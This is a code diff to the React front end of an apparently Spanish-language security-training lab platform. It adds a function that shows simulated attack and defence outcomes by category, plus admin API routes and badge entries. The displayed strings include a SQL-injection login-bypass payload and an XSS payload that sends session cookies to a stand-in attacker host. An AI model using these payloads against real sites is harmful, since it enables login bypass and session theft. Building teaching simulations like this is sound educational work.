@@ -12,6 +12,57 @@ interface Lab {
   puntajeMaximo: number;
 }
 
+const getSimulationDetails = (category: string, state: 'attack_success' | 'attack_blocked') => {
+  const cat = category ? category.toLowerCase() : '';
+  
+  if (cat.includes('inject') || cat.includes('sql')) {
+    return state === 'attack_success' ? {
+      title: '🚨 ACCESO CONCEDIDO (HACKED)',
+      payload: "Payload: ' OR '1'='1",
+      description: 'El atacante logró iniciar sesión sin conocer ninguna credencial.'
+    } : {
+      title: '🛡️ ATAQUE BLOQUEADO (SAFE)',
+      payload: 'Parámetro tratado como literal string.',
+      description: 'La consulta parametrizada neutralizó el payload.'
+    };
+  }
+  
+  if (cat.includes('xss') || cat.includes('cross-site')) {
+    return state === 'attack_success' ? {
+      title: '🚨 SCRIPT EJECUTADO (XSS HACKED)',
+      payload: "Payload: <script>fetch('attacker.com?c=' + document.cookie)</script>",
+      description: 'El atacante logró ejecutar código JavaScript y acceder a las cookies de la sesión.'
+    } : {
+      title: '🛡️ SCRIPT BLOQUEADO (SAFE)',
+      payload: 'Caracteres HTML sanitizados / escapados.',
+      description: 'El navegador interpretó el script como texto seguro sin ejecutarlo.'
+    };
+  }
+  
+  if (cat.includes('auth') || cat.includes('cred') || cat.includes('autent')) {
+    return state === 'attack_success' ? {
+      title: '🚨 SECRETOS EXPUESTOS (COMPROMISED)',
+      payload: 'Acceso no autorizado a secretos y API Keys.',
+      description: 'El atacante encontró contraseñas o tokens en texto plano expuestos en el repositorio.'
+    } : {
+      title: '🛡️ SECRETOS SEGUROS (SAFE)',
+      payload: 'Secretos almacenados fuera del código (e.g. .env).',
+      description: 'Las credenciales están seguras, parametrizadas y fuera del historial de Git.'
+    };
+  }
+  
+  // Default fallback
+  return state === 'attack_success' ? {
+    title: '🚨 SISTEMA VULNERADO (HACKED)',
+    payload: 'Explotación de vulnerabilidad exitosa.',
+    description: 'El sistema fue comprometido debido a la falta de controles seguros.'
+  } : {
+    title: '🛡️ SISTEMA PROTEGIDO (SAFE)',
+    payload: 'Controles de seguridad aplicados.',
+    description: 'El control implementado mitigó y neutralizó el vector de ataque.'
+  };
+};
+
 export default function App() {
   const [view, setView] = useState<View>('auth');
   const [email, setEmail] = useState('');
@@ -164,7 +215,8 @@ export default function App() {
       const errorData = await response.json().catch(() => ({}));
       throw new Error(errorData.error || errorData.message || 'Error en la petición.');
     }
-    return response.json();
+    const text = await response.text();
+    return text ? JSON.parse(text) : {};
   };
 
   const loadUserData = async (userId: string) => {
@@ -325,7 +377,7 @@ export default function App() {
   const handleEditLab = async (labId: string) => {
     setAdminLabLoading(true);
     try {
-      const data = await apiCall(`/api/labs/${labId}`);
+      const data = await apiCall(`/api/admin/labs/${labId}`);
       const diffLabel = (d: string) => d === 'beginner' ? 'Fácil' : d === 'intermediate' ? 'Medio' : 'Difícil';
       setEditLab({
         id: data.id,
@@ -406,7 +458,7 @@ export default function App() {
   const handleAdminViewLab = async (labId: string) => {
     setAdminLabLoading(true);
     try {
-      const data = await apiCall(`/api/labs/${labId}`);
+      const data = await apiCall(`/api/admin/labs/${labId}`);
       setAdminSelectedLab(data);
       setView('admin-lab-detail');
     } catch (err: any) {
@@ -1240,20 +1292,26 @@ export default function App() {
                     <p style={{ marginTop: '0.5rem', fontSize: '0.85rem' }}>Listo para ejecutar el script de ataque...</p>
                   </div>
                 )}
-                {simulationState === 'attack_success' && (
-                  <div style={{ height: '180px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', background: 'rgba(255,74,90,0.03)', border: '1px solid rgba(255,74,90,0.2)', borderRadius: '6px', padding: '1rem' }} className="animate-fade-in">
-                    <span style={{ fontSize: '2rem' }}>🚨 ACCESO CONCEDIDO (HACKED)</span>
-                    <p style={{ color: 'var(--color-danger)', fontSize: '0.85rem', marginTop: '0.5rem', fontFamily: 'var(--font-mono)' }}>Payload: ' OR '1'='1</p>
-                    <p style={{ fontSize: '0.8rem', textAlign: 'center', marginTop: '0.5rem', color: 'var(--text-secondary)' }}>El atacante logró iniciar sesión sin conocer ninguna credencial.</p>
-                  </div>
-                )}
-                {simulationState === 'attack_blocked' && (
-                  <div style={{ height: '180px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', background: 'rgba(0,245,160,0.03)', border: '1px solid rgba(0,245,160,0.2)', borderRadius: '6px', padding: '1rem' }} className="animate-fade-in">
-                    <span style={{ fontSize: '2rem' }}>🛡️ ATAQUE BLOQUEADO (SAFE)</span>
-                    <p style={{ color: 'var(--color-primary)', fontSize: '0.85rem', marginTop: '0.5rem', fontFamily: 'var(--font-mono)' }}>Parámetro tratado como literal string.</p>
-                    <p style={{ fontSize: '0.8rem', textAlign: 'center', marginTop: '0.5rem', color: 'var(--text-secondary)' }}>La consulta parametrizada neutralizó el payload.</p>
-                  </div>
-                )}
+                {simulationState === 'attack_success' && (() => {
+                  const details = getSimulationDetails(selectedLabDetail.category, 'attack_success');
+                  return (
+                    <div style={{ height: '180px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', background: 'rgba(255,74,90,0.03)', border: '1px solid rgba(255,74,90,0.2)', borderRadius: '6px', padding: '1rem' }} className="animate-fade-in">
+                      <span style={{ fontSize: '1.6rem', fontWeight: 'bold', textAlign: 'center', color: 'var(--color-danger)' }}>{details.title}</span>
+                      <p style={{ color: 'var(--color-danger)', fontSize: '0.85rem', marginTop: '0.5rem', fontFamily: 'var(--font-mono)' }}>{details.payload}</p>
+                      <p style={{ fontSize: '0.8rem', textAlign: 'center', marginTop: '0.5rem', color: 'var(--text-secondary)' }}>{details.description}</p>
+                    </div>
+                  );
+                })()}
+                {simulationState === 'attack_blocked' && (() => {
+                  const details = getSimulationDetails(selectedLabDetail.category, 'attack_blocked');
+                  return (
+                    <div style={{ height: '180px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', background: 'rgba(0,245,160,0.03)', border: '1px solid rgba(0,245,160,0.2)', borderRadius: '6px', padding: '1rem' }} className="animate-fade-in">
+                      <span style={{ fontSize: '1.6rem', fontWeight: 'bold', textAlign: 'center', color: 'var(--color-primary)' }}>{details.title}</span>
+                      <p style={{ color: 'var(--color-primary)', fontSize: '0.85rem', marginTop: '0.5rem', fontFamily: 'var(--font-mono)' }}>{details.payload}</p>
+                      <p style={{ fontSize: '0.8rem', textAlign: 'center', marginTop: '0.5rem', color: 'var(--text-secondary)' }}>{details.description}</p>
+                    </div>
+                  );
+                })()}
               </div>
             </div>
           </div>
@@ -1356,6 +1414,7 @@ export default function App() {
                     xss:              { name: 'Guardián del Frontend',        description: 'Se otorga al completar todos los laboratorios de la categoría XSS.',       icon: '🔰' },
                     autenticacion:    { name: 'Maestro de Autenticación',     description: 'Se otorga al completar todos los laboratorios de Autenticación.',           icon: '🔑' },
                     authentication:   { name: 'Maestro de Autenticación',     description: 'Se otorga al completar todos los laboratorios de Autenticación.',           icon: '🔑' },
+                    auth:             { name: 'Maestro de Autenticación',     description: 'Se otorga al completar todos los laboratorios de Autenticación.',           icon: '🔑' },
                   };
                   const key = lab.category?.toLowerCase();
                   const badge = badgeMap[key] ?? {
